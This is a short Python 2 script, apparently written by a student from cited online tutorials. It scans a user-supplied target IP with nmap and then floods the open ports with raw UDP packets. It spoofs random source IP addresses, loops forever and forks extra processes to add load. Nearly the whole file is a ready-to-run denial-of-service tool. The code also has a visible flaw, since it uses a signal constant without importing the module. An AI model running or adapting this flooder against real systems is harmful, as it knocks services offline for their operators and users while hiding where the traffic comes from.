#!/usr/bin/python

# Author: Stuart Woodbury
# email: yr45570@umbc.edu
# sources: http://null-byte.wonderhowto.com/how-to/udp-flooding-kick-local-user-off-network-0132581/
#		   http://xael.org/norman/python/python-nmap/ has examples of nmap in python
#		   https://pypi.python.org/pypi/python-nmap/0.2.7 
#		   http://www.binarytides.com/raw-socket-programming-in-python-linux/
#		    http://www.codingwithcody.com/2010/05/generate-random-ip-with-python/	

# this is not my own work. i used material from the aforementioned sources
# uses nmap to do a port scan and only attack certain ports
# causes memory leaks and is a little slow


import socket, sys
from struct import *
import os
import nmap
import time
import random

def randIP():
	
	first = random.randint(128,191)

	source_ip = ".".join([str(first),str(random.randint(1,255)),str(random.randint(1,255)),str(random.randint(1,255))])
	
	return source_ip


def attack(ip, lport):

	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) #Creates a  IP UDP socket

	sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

	while 1: #Infinitely loops sending packets to the port until the program is exited.

		for port in lport:				
			source_ip = randIP()
			dest_ip = ip # or socket.gethostbyname('www.google.com')
			 
			# ip header fields
			ip_ihl = 5
			ip_ver = 4
			ip_tos = 0
			ip_tot_len = 0  # kernel will fill the correct total length
			ip_id = random.randint(1,65535)   #Id of this packet
			ip_frag_off = 0
			ip_ttl = 255
			ip_proto = socket.IPPROTO_UDP
			ip_check = 0    # kernel will fill the correct checksum
			ip_saddr = socket.inet_aton ( source_ip )   #Spoof the source ip address if you want to
			ip_daddr = socket.inet_aton ( dest_ip )
			 
			ip_ihl_ver = (ip_ver << 4) + ip_ihl
			 
			# the ! in the pack format string means network order
			ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

			src_port = 49152
			dest_port = port
			data = random._urandom(1460) #Creates data
			length = 8 + len(data)
			checksum = 0

			udp_header =  pack('!HHHH', src_port, dest_port, length, checksum)

			packet = ip_header + udp_header

			sock.sendto(packet + data, (dest_ip, 1) )

	sock.close()


def main():

	nm = nmap.PortScanner()

	counter = 0
	ip=raw_input('Target IP: ') #The IP we are attacking
	nm.scan(ip, '1-443')
	#nm.scaninfo()

	foo = 0

	for proto in nm[ip].all_protocols():
		foo = foo + 1 #do nothing

	lport = nm[ip][proto].keys()
	lport.sort()

#	while foo < 4:
#		pid = os.fork()
#		if pid == 0:
#			attack(ip, lport)
#		else:
#			attack(ip, lport)
#		foo = foo + 1

	pids = []
	
	while foo < 3:
		pid = os.fork()
		pids.append(pid)
		if pid == 0:
			time.sleep(10)
			for p in pids:
				if p != 0:
					os.kill(int(p), signal.SIGTERM)
				
		else:
			attack(ip, lport)

		foo = foo + 1
	
main()
